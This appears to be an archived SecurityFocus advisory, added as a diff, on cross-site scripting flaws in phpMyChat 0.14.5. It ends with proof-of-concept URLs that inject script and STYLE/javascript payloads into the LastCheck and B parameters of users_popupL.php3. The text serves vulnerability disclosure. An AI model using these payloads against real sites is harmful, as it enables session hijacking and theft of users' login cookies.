@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/26698/info
+ 
+phpMyChat is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+ 
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+ 
+phpMyChat 0.14.5 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/mychat/chat/users_popupL.php3?From=..%2FphpMyChat.php3&L=english&LastCheck= 
+"></STYLE><STYLE>@import"javascript:alert(&#039;This%20XSS%20Is%20Xss&#039;)";</STYLE>&#039;
+=http://www.example.com/phpmychat/chat/users_popupL.php3?From=..%2FphpMyChat.php3&L=english&LastCheck=1196698786&B= 
+>"><script>alert("This%20XSS%20Test%20Successful")</script>
